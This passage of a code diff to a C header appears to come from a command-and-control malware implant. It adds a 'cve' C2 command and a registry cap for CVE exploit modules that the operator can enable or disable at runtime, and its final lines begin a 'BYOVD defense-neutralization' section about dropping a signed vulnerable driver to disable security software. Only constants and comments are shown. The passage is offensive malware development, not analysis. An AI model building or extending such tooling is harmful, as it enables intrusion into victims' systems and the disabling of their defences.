@@ -101,6 +101,7 @@
 #define CMD_ROTATE           "rotate"
 #define CMD_PING             "ping"
 #define CMD_PONG             "pong"
+#define CMD_CVE              "cve"
 
 /* ── Misc ───────────────────────────────────────────────────── */
 #define MAX_CONNECTIONS      128
@@ -227,6 +228,11 @@
 #define PLUGIN_MAX_REGISTRY     8
 #define PLUGIN_NAME_MAX         32
 #define PLUGIN_DEFAULT_ENABLED  1
+
+/* CVE module registry cap (#143). Modules are compile-time linked but
+ * enabled/disabled at runtime via the C2 `cve enable <id>` / `cve
+ * disable <id>` commands. A live feed without recompilation. */
+#define CVE_MAX_REGISTRY        8
 
 /* ── BYOVD Defense-Neutralization Scaffold (#94) ────────── */
 /* Bring-your-own-vulnerable-driver (BYOVD): drop a legitimately-signed
